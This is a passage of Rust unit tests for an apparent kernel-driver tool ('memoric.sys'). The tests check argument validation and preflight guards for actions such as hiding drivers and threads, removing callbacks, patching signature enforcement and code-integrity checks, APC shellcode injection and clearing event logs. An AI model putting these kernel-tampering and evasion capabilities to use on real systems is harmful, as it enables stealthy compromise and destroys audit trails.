                driver_pe_dump,
                vec!["output_path", "NUL or control"],
            ),
            (
                "driver_module_hide",
                json!({"driver_name": "C:\\Windows\\System32\\drivers\\memoric.sys"}),
                driver_module_hide,
                vec!["driver_name", "path separators"],
            ),
            (
                "driver_thread_hide",
                json!({"pid": 500, "thread_id": (u32::MAX as u64) + 1}),
                driver_thread_hide,
                vec!["thread_id", "u32 range"],
            ),
            (
                "driver_callback_remove",
                json!({"callback_type": "process", "index": 0, "callback_address": "not_hex"}),
                driver_callback_remove,
                vec!["callback_address", "expected integer"],
            ),
            (
                "driver_patch_kernel",
                json!({"patch_type": "dse", "enable": "yes"}),
                driver_patch_kernel,
                vec!["enable", "expected boolean"],
            ),
            (
                "driver_apc_inject",
                json!({"pid": 500, "shellcode_address": "not_hex", "shellcode_size": 8}),
                driver_apc_inject,
                vec!["shellcode_address", "expected integer"],
            ),
            (
                "driver_apc_inject",
                json!({"pid": 500, "shellcode_address": "0x1000", "shellcode_size": 0}),
                driver_apc_inject,
                vec!["shellcode_size", ">= 1"],
            ),
            (
                "driver_handle_strip",
                json!({"pid": 500, "access_mask": "all"}),
                driver_handle_strip,
                vec!["access_mask", "unsigned integer"],
            ),
            (
                "driver_reg_protect",
                json!({"registry_action": "add", "registry_flags": "delete", "key_path": 42}),
                driver_reg_protect,
                vec!["key_path", "expected string"],
            ),
            (
                "driver_notify_routine",
                json!({
                    "callback_action": "register",
                    "callback_type": "process",
                    "max_events": "many"
                }),
                driver_notify_routine,
                vec!["max_events", "unsigned integer"],
            ),
            (
                "driver_notify_routine",
                json!({
                    "callback_action": "query",
                    "callback_type": "process",
                    "max_events": 257
                }),
                driver_notify_routine,
                vec!["max_events", "<= 256"],
            ),
            (
                "driver_set_debug_port",
                json!({"pid": "not-a-pid"}),
                driver_set_debug_port,
                vec!["pid", "unsigned integer"],
            ),
            (
                "driver_dpc_timer",
                json!({"dpc_action": "schedule", "delay_ms": "slow"}),
                driver_dpc_timer,
                vec!["delay_ms", "unsigned integer"],
            ),
            (
                "driver_testsign_hide",
                json!({"testsign_action": 42}),
                driver_testsign_hide,
                vec!["testsign_action", "expected a string"],
            ),
            (
                "driver_ci_callback_patch",
                json!({"ci_action": 42}),
                driver_ci_callback_patch,
                vec!["ci_action", "expected a string"],
            ),
            (
                "driver_ci_func_patch",
                json!({"ci_action": 42}),
                driver_ci_func_patch,
                vec!["ci_action", "expected a string"],
            ),
            (
                "driver_force_kill",
                json!({"pid": 500, "exit_code": "oops!"}),
                driver_force_kill,
                vec!["exit_code", "unsigned integer"],
            ),
            (
                "driver_event_log_clear",
                json!({"log_action": "clear_all", "log_name": 42}),
                driver_event_log_clear,
                vec!["log_name", "expected string"],
            ),
        ];

        for (action, args, handler, expected_parts) in cases {
            let error = handler(&args).unwrap_err();
            assert!(
                error.contains(&format!("kernel(action='{action}')")),
                "{action} error should identify action: {error}"
            );
            for expected in expected_parts {
                assert!(
                    error.contains(expected),
                    "{action} error should contain {expected:?}: {error}"
                );
            }
            assert!(
                !error.contains("failed to ensure memoric.sys"),
                "{action} registry validation should run before driver ensure: {error}"
            );
        }
    }

    #[test]
    fn state_changing_kernel_action_requires_preflight_before_driver_open() {
        let _guard = crate::state::TEST_ENV_LOCK.lock().unwrap();
        let error = handle_kernel(&json!({
            "action": "driver_patch_kernel",
            "patch_type": "dse"
        }))
        .expect_err("live kernel mutation should fail closed at preflight before driver open");

        assert!(error.contains("kernel_preflight_failed"));
        assert!(error.contains("kernel(action='driver_patch_kernel')"));
        assert!(!error.contains("failed to ensure memoric.sys"));
    }

    #[test]
    fn kernel_dump_artifact_helper_registers_resource_link() {
        let path = std::env::temp_dir().join(format!(
            "memoric-kernel-dump-artifact-{}.json",
            std::process::id()
        ));
        let _ = std::fs::remove_file(&path);
        let artifact = write_kernel_artifact_bytes(
            &json!({
                "output_path": path.display().to_string(),
                "artifact_retention_secs": 60,
                "request_id": "kernel-dump-artifact-test"
            }),
            "driver-process-dump",
            Some(1234),
            br#"{"regions":[]}"#,
            "json",
        )
        .expect("kernel dump artifact");

        assert_eq!(artifact["path"], path.display().to_string());
        assert!(artifact["uri"]
            .as_str()
            .is_some_and(crate::artifact::is_artifact_uri));
        assert_eq!(artifact["size_bytes"], 14);

        let uri = artifact["uri"].as_str().unwrap();
        let _ = crate::artifact::forget(uri);
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn kernel_dump_auto_output_path_uses_temp_resource_name() {
        let artifact = write_kernel_artifact_bytes(
            &json!({"artifact_retention_secs": 60}),
            "driver-pe-dump",
            Some(4321),
            b"PE",
            "bin",
        )
        .expect("auto kernel dump artifact");

        let path = artifact["path"]
            .as_str()
            .expect("artifact path")
            .to_string();
        assert!(path.contains("memoric-driver-pe-dump-4321-"));
        assert!(path.ends_with(".bin"));
        let uri = artifact["uri"].as_str().expect("artifact uri");
        assert!(crate::artifact::is_artifact_uri(uri));

        let _ = crate::artifact::forget(uri);
        let _ = std::fs::remove_file(path);
    }
}
